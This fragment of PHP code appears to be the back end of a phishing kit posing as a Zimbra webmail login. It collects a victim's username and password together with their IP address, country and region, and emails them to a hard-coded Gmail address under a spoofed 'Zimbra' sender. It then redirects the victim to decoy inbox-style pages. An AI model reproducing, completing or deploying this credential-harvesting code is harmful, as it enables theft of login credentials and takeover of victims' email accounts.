...
$own = 'testtools87@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'result';
$page = 'Zimbra';
$subj = "$page.V.03.01.2024 Logins";
$headers .= "From: Zimbra<$sender>\n";
...
$msg = "<HTML><BODY><TABLE>
 ...
 <tr><td>$page Username: $email  
 <br>Password: $pass  
 <tr><td><br>IP: $country | <a href='http://whoer.net/check?host=$ip' target='_blank' >$ip</a> | <img src='http://www.translatorscafe.com/cafe/images/flags/$countryCode.gif' height='12' /> | $countryCode | $continentCode | $regionName | Date: $server </td></tr>
...
header( "Location: indexx.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: progress.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
